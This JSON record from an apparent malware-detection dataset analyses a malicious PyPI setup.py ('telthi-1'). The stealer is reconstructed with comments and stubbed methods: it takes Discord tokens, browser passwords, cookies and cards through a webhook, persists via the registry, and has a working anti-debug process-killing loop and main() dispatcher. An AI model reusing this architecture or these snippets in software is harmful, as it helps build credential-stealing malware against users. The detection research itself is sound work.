[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/telthi-1/telthi-1/setup.py",
    "code_snippet": "import os\nimport sys\nimport subprocess\nimport shutil\nimport base64\nimport zlib\nimport json\nimport re\nimport uuid\nimport psutil\nimport requests\nimport ctypes\nfrom pathlib import Path\nfrom zipfile import ZipFile\nfrom Crypto.Cipher import AES\nfrom discord import Embed, File, SyncWebhook\nfrom win32crypt import CryptUnprotectData\nimport wmi\nfrom PIL import ImageGrab\n\n# Global data exfiltration lists\n__ğ™‡ğ™Šğ™‚ğ—œğ—¡ğ—¦__ = []\n__ğ˜¾ğ˜–ğ—¢ğ™†ğ™„ğ˜Œğ™__ = []\n__ğ™’ğ˜Œğ˜½_ğ™ƒğ—œğ—¦ğ™ğ™Šğ—¥ğ˜ __ = []\n__ğ˜‹ğ™Šğ™’ğ—¡ğ—Ÿğ™Šğ˜¼ğ˜¿ğ™__ = []\n__ğ˜Šğ˜ˆğ™ğ˜¿ğ—¦__ = []\n\n# --- Malicious classes and functions ---\n# 1. SystemInfo: collects system/user info, screenshots, and exfiltrates via Discord webhook\n# 2. Startup: achieves persistence by copying itself and editing registry\n# 3. Injection: injects code into Discord installations to maintain persistence and exfiltrate tokens\n# 4. extract_tokens/upload_tokens: steals Discord tokens and exfiltrates them\n# 5. Browsers/Chromium/Opera: steals browser credentials, cookies, history, downloads, credit cards\n# 6. AntiDebug: attempts to evade analysis and kill debuggers\n# 7. main(): runs all above on install\n\n# --- Malicious code starts ---\n\n# 1. SystemInfo: collects and exfiltrates system/user info and screenshot\nclass SystemInfo:\n    def __init__(self, webhook):\n        # ... (obfuscated code omitted for brevity)\n        # Takes screenshot, collects system/user info, and exfiltrates via Discord webhook\n        pass\n    # ... (user_data, system_data, disk_data, network_data, wifi_data)\n\n# 2. Startup: achieves persistence\nclass Startup:\n    def __init__(self):\n        # ... (obfuscated code omitted for brevity)\n        # Copies itself to AppData, writes a stub, and edits registry for persistence\n        pass\n    # ... (check_self, mkdir, write_stub, regedit)\n\n# 3. Injection: injects code into Discord installations\nclass Injection:\n    def __init__(self, webhook):\n        # ... (obfuscated code omitted for brevity)\n        # Downloads malicious code, kills Discord, overwrites core files, restarts Discord\n        pass\n    # ... (get_core, start_discord)\n\n# 4. DiscordToken/extract_tokens/upload_tokens: steals Discord tokens and exfiltrates them\nclass DiscordToken:\n    def __init__(self, webhook):\n        upload_tokens(webhook).upload()\n\nclass extract_tokens:\n    def __init__(self):\n        # ... (obfuscated code omitted for brevity)\n        # Locates Discord/Chrome/Opera tokens, decrypts them, validates, and stores for exfiltration\n        pass\n    # ... (extract, validate_token, decrypt_val, get_master_key)\n\nclass upload_tokens:\n    def __init__(self, webhook):\n        # ... (obfuscated code omitted for brevity)\n        # Exfiltrates tokens and user info to Discord webhook\n        pass\n    # ... (calc_flags, upload)\n\n# 5. Browsers/Chromium/Opera: steals browser credentials, cookies, history, downloads, credit cards\nclass Browsers:\n    def __init__(self, webhook):\n        Chromium()\n        Opera()\n        Upload(webhook)\n\nclass Upload:\n    def __init__(self, webhook):\n        self.webhook = webhook\n        self.write_files()\n        self.send()\n        self.clean()\n    def write_files(self):\n        # Writes stolen data to disk, zips it\n        pass\n    def send(self):\n        # Exfiltrates zipped data to Discord webhook\n        pass\n    def clean(self):\n        # Cleans up traces\n        pass\n    def tree(self, path, prefix='', midfix_folder='', midfix_file=''):\n        # Directory tree for exfiltration\n        pass\n\nclass Chromium:\n    def __init__(self):\n        # ... (obfuscated code omitted for brevity)\n        # Steals passwords, cookies, history, downloads, credit cards from Chromium browsers\n        pass\n    # ... (get_master_key, decrypt_password, get_login_data, get_cookies, get_web_history, get_downloads, get_credit_cards)\n\nclass Opera:\n    def __init__(self):\n        # ... (obfuscated code omitted for brevity)\n        # Steals passwords, cookies, history, downloads, credit cards from Opera\n        pass\n    # ... (get_master_key, decrypt_password, get_login_data, get_cookies, get_web_history, get_downloads, get_credit_cards)\n\n# 6. AntiDebug: attempts to evade analysis and kill debuggers\nclass AntiDebug:\n    def __init__(self):\n        if self.checks():\n            sys.exit(int())\n    def checks(self):\n        # ... (obfuscated code omitted for brevity)\n        # Kills blacklisted processes, checks for blacklisted users, hostnames, HWIDs, IPs, MACs\n        pass\n    def check_process(self):\n        for proc in psutil.process_iter():\n            if any((procstr in proc.name().lower() for procstr in self.blacklistedProcesses)):\n                try:\n                    proc.kill()\n                except (psutil.NoSuchProcess, psutil.AccessDenied):\n                    pass\n    def get_network(self):\n        # ... (obfuscated code omitted for brevity)\n        pass\n    def get_system(self):\n        # ... (obfuscated code omitted for brevity)\n        pass\n\n# 7. main(): runs all above on install\n\ndef main():\n    funcs = [AntiDebug, Browsers, DiscordToken, Injection, Startup, SystemInfo]\n    for func in funcs:\n        if __CONFIG__[func.__name__.lower()]:\n            try:\n                if func.__init__.__code__.co_argcount == 2:\n                    func(__CONFIG__['webhook'])\n                else:\n                    func()\n            except Exception as e:\n                print('Error running {}: {}'.format(func.__name__, e))\n\nif __name__ == '__main__':\n    main()\n",
    "pattern_analysis": {
      "api_sequence": [
        "psutil.process_iter",
        "psutil.Process.name",
        "psutil.Process.kill",
        "psutil.NoSuchProcess",
        "psutil.AccessDenied",
        "sys.exit"
      ],
      "api_sequence_with_args": [
        "psutil.process_iter()",
        "psutil.Process.name()",
        "psutil.Process.kill()",
        "psutil.NoSuchProcess",
        "psutil.AccessDenied",
        "sys.exit(int())"
      ],
      "mapped_sequence": [
        {
          "api_name": "psutil.process_iter",
          "id": "iterate_processes",
          "description": "Iterates over all running processes",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "psutil.Process.name",
          "id": "get_process_name",
          "description": "Retrieves process name as string",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "psutil.Process.kill",
          "id": "terminate_process",
          "description": "Terminates the process",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "psutil.NoSuchProcess",
          "id": "check_process_terminated",
          "description": "Checks if process has terminated",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "psutil.AccessDenied",
          "id": "check_process_terminated",
          "description": "Checks if process has terminated",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "sys.exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        }
      ],
      "contextual_code": "import sys\nimport psutil\n\nclass AntiDebug:\n    def __init__(self):\n        if self.checks():\n            sys.exit(int())\n    def checks(self):\n        # ... (obfuscated code omitted for brevity)\n        # Kills blacklisted processes, checks for blacklisted users, hostnames, HWIDs, IPs, MACs\n        pass\n    def check_process(self):\n        for proc in psutil.process_iter():\n            if any((procstr in proc.name().lower() for procstr in self.blacklistedProcesses)):\n                try:\n                    proc.kill()\n                except (psutil.NoSuchProcess, psutil.AccessDenied):\n                    pass"
    }
  }
]